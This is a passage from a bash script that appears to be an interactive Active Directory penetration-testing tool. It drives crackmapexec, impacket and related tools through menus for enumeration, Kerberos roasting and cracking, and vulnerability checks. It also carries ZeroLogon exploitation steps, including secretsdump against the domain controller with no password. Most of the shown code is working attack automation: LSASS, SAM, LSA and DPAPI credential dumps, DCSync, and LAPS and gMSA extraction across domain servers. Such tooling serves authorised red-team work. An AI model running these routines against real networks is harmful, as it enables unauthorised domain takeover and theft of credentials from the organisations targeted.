        if [ ! "${pki_server}" == "" ] && [ ! "${pki_ca}" == "" ]; then
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] Targeting DC only${NC}"
                masky_dump_dc
            else
                smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
            done
            fi
        else
            echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
        fi

    fi
    echo -e ""
}

mssql_enum () {
    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
        elif [ "${nullsess_bool}" == false ]; then
            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
            for i in $(/bin/cat ${sql_hostname_list}); do
                grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
            done
        fi
        if [ ! -f "${sql_ip_list}" ] ; then
             echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
        else
            ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

nopac_check () {
    echo -e "${BLUE}[*] NoPac check ${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
    echo -e ""
}

petitpotam_check () {
    echo -e "${BLUE}[*] PetitPotam check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

dfscoerce_check () {
    echo -e "${BLUE}[*] dfscoerce check ${NC}"
    for i in $(/bin/cat ${target_dc}); do
        ${crackmapexec} smb ${i} ${argument_cme} -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
    done
    echo -e ""
}

zerologon_check () {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
    if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\\$@$dc_ip -no-pass -just-dc-user Administrator"
        echo -e "secretsdump.py -hashes :<HASH_admin> $dc_domain/Administrator@$dc_ip"
        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HEXPASS>"
    fi
    echo -e ""
}

ms17-010_check_dc () {
    echo -e "${BLUE}[*] ms17-010 check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_dc_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ms17-010_check () {
    echo -e "${BLUE}[*] ms17-010 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        ms17-010_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

spooler_check_dc () {
    echo -e "${BLUE}[*] Print Spooler check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_dc_output_${dc_domain}.txt 2>&1      
    echo -e ""
}

spooler_check () {
    echo -e "${BLUE}[*] Print Spooler check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
       spooler_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
    fi
    echo -e ""
}

webdav_check_dc () {
    echo -e "${BLUE}[*] WebDAV check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_dc_output_${dc_domain}.txt 2>&1
    echo -e ""
}

webdav_check () {
    echo -e "${BLUE}[*] WebDAV check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        webdav_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

shadowcoerce_check_dc () {
    echo -e "${BLUE}[*] shadowcoerce check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_dc_output_${dc_domain}.txt 2>&1
    echo -e ""
}

shadowcoerce_check () {
    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        shadowcoerce_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

smbsigning_check () {
    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
    if [ "${kerb_bool}" == false ]; then
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} 2>/dev/null | grep "signing:False" | sort -u | tee ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

ntlmv1_check_dc () {
    echo -e "${BLUE}[*] ntlmv1 check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_dc_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ntlmv1_check () {
    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        ntlmv1_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

runasppl_check_dc () {
    echo -e "${BLUE}[*] runasppl check on DC${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_dc_output_${dc_domain}.txt 2>&1
    echo -e ""
}

runasppl_check () {
    echo -e "${BLUE}[*] runasppl check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        runasppl_check_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

ad_enum () {
    bhd_enum
    ldapdomain_enum
    silenthound_enum
    windapsearch_enum
    enum4linux_enum
    ridbrute_attack
    users_enum
    userpass_cme_check
    passpol_enum
    gpp_enum
    passnotreq_enum
    adcs_enum
    passdesc_enum
    macq_enum
    ldapsign_enum
    deleg_enum_cme
    deleg_enum_imp
    certi_py_enum
    certipy_enum
}

kerberos () {
    kerbrute_enum
    userpass_kerbrute_check
    asrep_attack
    asreprc4_attack
    kerberoast_attack
    john_crack_asrep
    john_crack_kerberoast
}

scan_shares () {
    smb_map
    shares_cme
    spider_cme
    keepass_scan
}

pwd_dump () {
    laps_dump
    gmsa_dump
    secrets_dump
    sam_dump
    lsa_dump
    lsassy_dump
    handlekatz_dump
    procdump_dump
    nanodump_dump
    masky_dump
    donpapi_dump
}

vuln_checks () {
    nopac_check
    petitpotam_check
    zerologon_check
    ms17-010_check
    spooler_check
    webdav_check
    dfscoerce_check
    shadowcoerce_check
    smbsigning_check
    ntlmv1_check
    runasppl_check
}

print_info() {
    echo -e ${auth_string}
    echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${dc_ip}"
    echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
    echo -e "${YELLOW}[i]${NC} Output folder: $(realpath $output_dir)"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
    echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"
}

ad_menu () {
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    echo -e "A) ALL ACTIVE DIRECTORY ENUMERATIONS"
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "3) ldapdomain Enumeration"
    echo -e "4) SilentHound Enumeration"
    echo -e "5) windapsearch Enumeration"
    echo -e "6) enum4linux-ng Enumeration"
    echo -e "7) RID Brute Force (Null session)"
    echo -e "8) Users Enumeration"
    echo -e "9) crackmapexec User=Pass Check (Noisy!)"
    echo -e "10) Password Policy Enumeration"
    echo -e "11) GPP Enumeration"
    echo -e "12) Password not required Enumeration"
    echo -e "13) ADCS Enumeration"
    echo -e "14) Users Description containing word: pass"
    echo -e "15) Get MachineAccountQuota"
    echo -e "16) LDAP-signing check"
    echo -e "17) Trusted-for-delegation check (cme)"
    echo -e "18) Impacket findDelegation Enumeration"
    echo -e "19) certi.py Enumeration"
    echo -e "20) Certipy Enumeration"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        dns_enum
        ad_enum
        ad_menu
        ;;

        1)
        bhd_enum
        ad_menu
        ;;

        2)
        bhd_enum_dconly
        ad_menu
        ;;

        3)
        ldapdomain_enum
        ad_menu
        ;;

        4)
        silenthound_enum
        ad_menu
        ;;

        5)
        windapsearch_enum
        ad_menu
        ;;

        6)
        enum4linux_enum
        ad_menu
        ;;

        7)
        ridbrute_attack
        ad_menu;;

        8)
        users_enum
        ad_menu;;

        9)
        userpass_cme_check
        ad_menu;;

        10)
        passpol_enum
        ad_menu;;

        11)
        gpp_enum
        ad_menu;;

        12)
        passnotreq_enum
        ad_menu;;

        13)
        adcs_enum
        ad_menu;;

        14)
        passdesc_enum
        ad_menu;;

        15)
        macq_enum
        ad_menu;;

        16)
        ldapsign_enum
        ad_menu;;

        17)
        deleg_enum_cme
        ad_menu;;

        18)
        deleg_enum_imp
        ad_menu;;

        19)
        certi_py_enum
        ad_menu;;

        20)
        certipy_enum
        ad_menu;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

kerberos_menu () {
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    echo -e "A) ALL KERBEROS ATTACKS"
    echo -e "1) kerbrute User Enumeration (Null session)"
    echo -e "2) kerbrute User=Pass Check (Noisy!)"
    echo -e "3) AS REP Roasting Attack"
    echo -e "4) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
    echo -e "5) Kerberoast Attack"
    echo -e "6) Cracking AS REP Roast hashes using john the ripper"
    echo -e "7) Cracking Kerberoast hashes using john the ripper"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        kerberos
        kerberos_menu
        ;;

        1)
        kerbrute_enum
        kerberos_menu
        ;;

        2)
        userpass_kerbrute_check
        kerberos_menu
        ;;

        3)
        asrep_attack
        kerberos_menu
        ;;

        4)
        asreprc4_attack
        kerberos_menu
        ;;

        5)
        kerberoast_attack
        kerberos_menu
        ;;

        6)
        john_crack_asrep
        kerberos_menu
        ;;
        
        7)
        john_crack_kerberoast
        kerberos_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu () {
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "1) smbmap shares Enumeration on target Domain Controller"
    echo -e "2) smbmap shares Enumeration on all domain servers"
    echo -e "3) smbmap shares Enumeration on custom list of servers"
    echo -e "4) SMB shares Enumeration using cme on target Domain Controller"
    echo -e "5) SMB shares Enumeration using cme on all domain servers"
    echo -e "6) SMB shares Enumeration using cme on custom list of servers"
    echo -e "7) SMB shares Spidering using cme on target Domain Controller"
    echo -e "8) SMB shares Spidering using cme on all domain servers"
    echo -e "9) SMB shares Spidering using cme on custom list of servers"
    echo -e "10) KeePass Discovery on target Domain Controller"
    echo -e "11) KeePass Discovery on all domain servers"
    echo -e "12) KeePass Discovery on custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        dns_enum
        smb_map_dc
        shares_menu
        ;;

        2)
        dns_enum
        allservers_bool=true
        smb_map
        shares_menu
        ;;

        3)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        smb_map
        shares_menu
        ;;

        4)
        dns_enum
        shares_cme_dc
        shares_menu
        ;;

        5)
        dns_enum
        allservers_bool=true
        shares_cme
        shares_menu
        ;;

        6)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        shares_cme
        shares_menu
        ;;

        7)
        dns_enum
        allservers_bool=true
        spider_cme_dc
        shares_menu
        ;;

        8)
        dns_enum
        spider_cme
        shares_menu
        ;;

        9)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        spider_cme
        shares_menu
        ;;

        10)
        dns_enum
        keepass_scan_dc
        shares_menu
        ;;

        11)
        dns_enum
        allservers_bool=true
        keepass_scan
        shares_menu
        ;;

        12)
        dns_enum
        allservers_bool=false
        while [ ! -f "${servers_list}" ] ; do
            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        done
        keepass_scan
        shares_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac
 
}

vulns_menu () {
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "A) ALL VULNERABILITY CHECKS"
    echo -e "1) NoPac check"
    echo -e "2) PetitPotam check"
    echo -e "3) dfscoerce check"
    echo -e "4) zerologon check"
    echo -e "5) MS17-010 check on Domain Controllers"
    echo -e "6) MS17-010 check on all domain servers"
    echo -e "7) MS17-010 check on custom list of servers"
    echo -e "8) Print Spooler check on Domain Controllers"
    echo -e "9) Print Spooler check on all domain servers"
    echo -e "10) Print Spooler check on custom list of servers"
    echo -e "11) WebDAV check on Domain Controllers"
    echo -e "12) WebDAV check on all domain servers"
    echo -e "13) WebDAV check on custom list of servers"
    echo -e "14) shadowcoerce check on Domain Controllers"
    echo -e "15) shadowcoerce check on all domain servers"
    echo -e "16) shadowcoerce check on custom list of servers"
    echo -e "17) SMB signing check on all domain servers"
    echo -e "18) ntlmv1 check on Domain Controllers"
    echo -e "19) ntlmv1 check on all domain servers"
    echo -e "20) ntlmv1 check on custom list of servers"
    echo -e "21) runasppl check on Domain Controllers"
    echo -e "22) runasppl check on all domain servers"
    echo -e "23) runasppl check on custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        dns_enum
        vuln_checks
        vulns_menu
        ;;

        1)
        nopac_check
        vulns_menu
        ;;

        2)
        petitpotam_check
        vulns_menu
        ;;

        3)
        dfscoerce_check
        vulns_menu
        ;;

        4)
        zerologon_check
        vulns_menu
        ;;

        5)
        ms17-010_check_dc
        vulns_menu
        ;;

        6)
        dns_enum
        allservers_bool=true
        ms17-010_check
        vulns_menu
        ;;
        
        7)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        ms17-010_check
        vulns_menu
        ;;

        8)
        spooler_check_dc
        vulns_menu
        ;;

        9)
        dns_enum
        allservers_bool=true
        spooler_check
        vulns_menu
        ;;

        10)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        spooler_check
        vulns_menu
        ;;

        11)
        webdav_check_dc
        vulns_menu
        ;;

        12)
        dns_enum
        allservers_bool=true
        webdav_check
        vulns_menu
        ;;

        13)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        webdav_check
        vulns_menu
        ;;

        14)
        shadowcoerce_check_dc
        vulns_menu
        ;;

        15)
        dns_enum
        allservers_bool=true
        shadowcoerce_check
        vulns_menu
        ;;

        16)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        shadowcoerce_check
        vulns_menu
        ;;

        17)
        dns_enum
        allservers_bool=true
        smbsigning_check
        vulns_menu
        ;;

        18)
        ntlmv1_check_dc
        vulns_menu
        ;;

        19)
        dns_enum
        allservers_bool=true
        ntlmv1_check
        vulns_menu
        ;;

        20)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        ntlmv1_check
        vulns_menu
        ;;

        21)
        runasppl_check_dc
        vulns_menu
        ;;

        22)
        dns_enum
        allservers_bool=true
        runasppl_check
        vulns_menu
        ;;

        23)
        dns_enum
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        runasppl_check
        vulns_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

pwd_menu () {
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "A) ALL PASSWORD DUMPS"
    echo -e "1) LAPS Dump"
    echo -e "2) gMSA Dump"
    echo -e "3) DCSync using secretsdump"
    echo -e "4) Dump SAM from DC using crackmapexec"
    echo -e "5) Dump SAM from all domain servers using crackmapexec"
    echo -e "6) Dump SAM from custom list of servers using crackmapexec"
    echo -e "7) Dump LSA secrets from DC using crackmapexec"
    echo -e "8) Dump LSA secrets from all domain servers using crackmapexec"
    echo -e "9) Dump LSA secrets from custom list of servers using crackmapexec"
    echo -e "10) Dump LSASS from DC using lsassy"
    echo -e "11) Dump LSASS from all domain servers using lsassy"
    echo -e "12) Dump LSASS from custom list of servers using lsassy"
    echo -e "13) Dump LSASS from DC using handlekatz"
    echo -e "14) Dump LSASS from all domain servers using handlekatz"
    echo -e "15) Dump LSASS from custom list of servers using handlekatz"
    echo -e "16) Dump LSASS from DC using procdump"
    echo -e "17) Dump LSASS from all domain servers using procdump"
    echo -e "18) Dump LSASS from custom list of servers using procdump"
    echo -e "19) Dump LSASS from DC using nanodump"
    echo -e "20) Dump LSASS from all domain servers using nanodump"
    echo -e "21) Dump LSASS from custom list of servers using nanodump"
    echo -e "22) Dump LSASS from DC using masky (ADCS required)"
    echo -e "23) Dump LSASS from all domain servers using masky (ADCS required)"
    echo -e "24) Dump LSASS from custom list of servers using masky (ADCS required)"
    echo -e "25) Dump secrets using DonPAPI from DC"
    echo -e "26) Dump secrets using DonPAPI from all domain servers"
    echo -e "27) Dump secrets using DonPAPI from custom list of servers"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        dns_enum
        pwd_dump
        pwd_menu
        ;;

        1)
        laps_dump
        pwd_menu
        ;;

        2)
        gmsa_dump
        pwd_menu
        ;;

        3)
        secrets_dump_dc
        pwd_menu
        ;;

        4)
        sam_dump_dc
        pwd_menu
        ;;

        5)
        allservers_bool=true
        sam_dump
        pwd_menu
        ;;
        
        6)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        sam_dump
        pwd_menu
        ;;

        7)
        lsa_dump_dc
        pwd_menu
        ;;

        8)
        allservers_bool=true
        lsa_dump
        pwd_menu
        ;;

        9)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        lsa_dump
        pwd_menu
        ;;

        10)
        lsassy_dump_dc
        pwd_menu
        ;;

        11)
        allservers_bool=true
        pwd_menu
        lsassy_dump
        ;;

        12)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        lsassy_dump
        pwd_menu
        ;;

        13)
        handlekatz_dump_dc
        pwd_menu
        ;;

        14)
        allservers_bool=true
        pwd_menu
        handlekatz_dump
        ;;

        15)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        handlekatz_dump
        pwd_menu
        ;;

        16)
        procdump_dump_dc
        pwd_menu
        ;;

        17)
        allservers_bool=true
        procdump_dump
        pwd_menu
        ;;

        18)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        procdump_dump
        pwd_menu
        ;;

        19)
        nanodump_dump_dc
        pwd_menu
        ;;

        20)
        allservers_bool=true
        nanodump_dump
        pwd_menu
        ;;

        21)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        nanodump_dump
        pwd_menu
        ;;

        22)
        masky_dump_dc
        pwd_menu
        ;;

        23)
        allservers_bool=true
        masky_dump
        pwd_menu
        ;;

        24)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        masky_dump
        pwd_menu
        ;;

        25)
        donpapi_dump_dc
        pwd_menu
        ;;

        26)
        allservers_bool=true
        donpapi_dump
        pwd_menu
        ;;

        27)
        allservers_bool=false
        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
            read -p ">> " servers_list </dev/tty
        fi
        donpapi_dump
        pwd_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

config_menu () {
    echo -e ""
    echo -e "${CYAN}[Config menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------"
    echo -e "ENTER) Go to Main Menu"
    echo -e "1) Check installation of tools and dependencies"
    echo -e "2) Change output folder"
    echo -e "3) Synchronize time with Domain Controller (requires root)"
    echo -e "4) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "5) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "6) Download default username and password wordlists (non-kali machines)"
    echo -e "7) Change users wordlist file"
    echo -e "8) Change passwords wordlist file"
    echo -e "9) Define custom servers list"
    echo -e "10) Show session information"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        echo -e ""
        if [ ! -f "${python}" ] ; then echo -e "${RED}[-] python is not installed${NC}"; else echo -e "${GREEN}[+] python is installed${NC}"; fi
        if [ ! -f "${impacket_findDelegation}" ] ; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
        if [ ! -f "${impacket_GetUserSPNs}" ] ; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
        if [ ! -f "${impacket_secretsdump}" ] ; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
        if [ ! -f "${impacket_GetNPUsers}" ] ; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
        if [ ! -f "${impacket_getTGT}" ] ; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
        if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
        if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
        if [ ! -f "${crackmapexec}" ] ; then echo -e "${RED}[-] crackmapexec is not installed${NC}"; else echo -e "${GREEN}[+] crackmapexec is installed${NC}"; fi
        if [ ! -f "${john}" ] ; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
        if [ ! -f "${smbmap}" ] ; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
        if [ ! -f "${nmap}" ] ; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
        if [ ! -f "${adidnsdump}" ] ; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
        if [ ! -f "${certi_py}" ] ; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
        if [ ! -f "${certipy}" ] ; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
        if [ ! -f "${scripts_dir}/windapsearch" ] ; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
